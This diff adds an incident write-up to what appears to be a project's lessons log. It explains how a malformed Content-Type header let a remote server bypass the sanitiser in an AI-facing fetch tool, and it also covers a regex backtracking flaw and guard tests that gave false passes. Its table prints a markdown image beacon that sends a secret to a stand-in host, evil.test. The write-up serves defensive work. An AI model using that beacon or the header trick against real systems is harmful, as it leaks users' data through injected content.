@@ -1354,3 +1354,76 @@ pair absent produces *"mcp-curl requires Node >= 22"*.
 - **A test can pin a defect in place.** `register-all-tools.test.ts` asserted
   `expect(text).toContain(contentType)` — the remote header appearing in returned
   text — as though it were the desired behaviour. It passed on every run.
+
+### RC-31 — the validation added to close a channel switched the defence off
+
+**Date:** 2026-09-07 · **PR:** #37 · **Plan:** `docs/todos/008-P2-over-cap-preview-is-computed-then-discarded.md`
+
+**Class:** K-2, K-11, K-1 — *class-id:* `fail-open-default`, `unchecked-assertion`, `unbounded-growth`
+
+- **The plan said:** RC-30's fix was complete. `MEDIA_TYPE_PATTERN` constrains
+  `%{content_type}` at the parse boundary, a failure resolves to `undefined`,
+  and `undefined` "already means no usable declared grammar and already selects
+  the strictest one downstream". That last clause was written as a statement of
+  fact about the code. **It was a statement about a consumer, and no consumer
+  implemented it.**
+- **Reality was:** `contentTypeUndetermined` is keyed on a *different absence* —
+  whether our own `-w` metadata block was found — and for a malformed header it
+  was found. `defendText`'s `strictestGrammar` consulted only that flag, so a
+  **rejected** content type took the PERMISSIVE path. Measured on the shipped
+  bundle, one body and one beacon:
+
+  | declared `Content-Type` | returned |
+  |---|---|
+  | `text/markdown` | `hello [image removed] and  end` |
+  | `text/markdown;;` | `hello ![x](https://evil.test/?d=secret) and <!--c--> end` |
+
+  The remote chose which by malforming its own header. This is invariant 1a's
+  stated failure shape — *"the gate was attacker-controllable: setting
+  `Content-Type: image/png` disabled the entire pipeline"* — arriving through the
+  guard added to stop the field carrying prose, and it was **worse than the
+  defect it replaced**: before, the malformed value was echoed (bad) but still
+  classified correctly (safe).
+- **Two more, in the same guard, both against claims its own doc-block made:**
+  - The residual was recorded as *"bounded at 512 characters … a 16x reduction"*.
+    The parameter group repeats `{0,32}`, so the real bound was the whole
+    8,192-byte metadata window — **wrong by roughly 15x**, and a decline
+    elsewhere had been priced against the smaller figure. Measured: 7,680
+    characters of free-form prose passed intact. The unquoted token class also
+    admits `- . _ ' * % ~ | ^`, so prose needs neither quoting nor spaces, which
+    the same doc-block claimed was "rejected outright".
+  - *"Linear per invariant 15 … no input can make the engine backtrack"* was
+    false. Bounded quantifiers are not sufficient: the tail `[ \t]*;?[ \t]*$` is
+    two quantified runs over one alphabet separated only by an optional element
+    at an anchor, so a failing suffix is rescanned per starting offset. Measured
+    0.71 ms at 500 trailing spaces rising to 39.4 ms at 8,000, and 122.8 ms on
+    other shapes at the cap — on the thread serving every session. The
+    measurement in the doc-block had exercised early exits, not the failing
+    suffix.
+- **What we did:** three edits, each at the layer where no caller can forget it.
+  `defendText` now tests `options.contentType === undefined` alongside the flag,
+  so the doc-block's claim is true at the one consumer that acts on it — and it
+  holds for the published `defendText` too (invariant 11). `parseResponseWithMetadata`
+  keeps only the **type/subtype** and discards the parameter tail after matching:
+  nothing in the tree reads a parameter, every consumer passes the value through
+  `parseMimeType`, so the projection costs no information and removes the
+  space-bearing region entirely. And a `MEDIA_TYPE_MAX_LENGTH` precondition
+  bounds the regex's input before it runs.
+- **The lesson about the rule, not the bug:** *"every quantifier is bounded"* did
+  not find this, and it is what a careful reader checks. The rule that finds it
+  is RC-14's, generalised: **for every repeated character class, name every token
+  the match must still consume after it, and check the class against all of
+  them.** A zero-width anchor is not a literal outside the class.
+- **And a lesson about the probe.** Two of the three new guards were **false
+  greens on first writing**, and both were caught only by reverting the fix:
+  - the linearity guard passed with the quadratic tail restored, because the new
+    length precondition short-circuited the regex before the pathological input
+    reached it — **a guard whose teeth belonged to its neighbour**;
+  - the length-bound guard passed with the length check removed, because its
+    fixture used 300 parameters, which the grammar's own `{0,32}` rejects anyway.
+
+  Both had been written *in response to a measured defect*, by a session that had
+  already recorded RC-28's "a guard written to replace a false green inherits the
+  pressure that produced the first one". **It happened again in the same PR.**
+  Probe each guard against its OWN mutation, one at a time, never the fix as a
+  set — a set-wise probe cannot tell which member carries the teeth.
